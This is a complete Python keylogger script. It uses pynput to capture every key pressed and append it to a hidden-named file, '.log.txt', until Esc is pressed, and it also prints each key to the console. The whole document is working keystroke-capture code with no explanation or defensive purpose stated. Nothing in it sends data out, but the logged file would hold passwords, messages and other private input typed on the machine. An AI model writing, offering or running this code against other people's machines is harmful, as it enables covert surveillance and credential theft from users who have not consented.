from pynput import keyboard

f = open(".log.txt","a+")

def on_press(key):
    if key == keyboard.Key.esc:
        return False  # stop listener
    try:
        k = key.char  # single-char keys
        f.write(k)
    except:
        k = key.name  # other keys
        if(k=="space"):
            f.write(" ")
        elif(k=="enter"):
            f.write("\n")

    print('Key pressed: ' + k)

listener = keyboard.Listener(on_press=on_press)

listener.start()  # start to listen on a separate thread
listener.join()  # remove if main thread is polling self.keys

f.close()
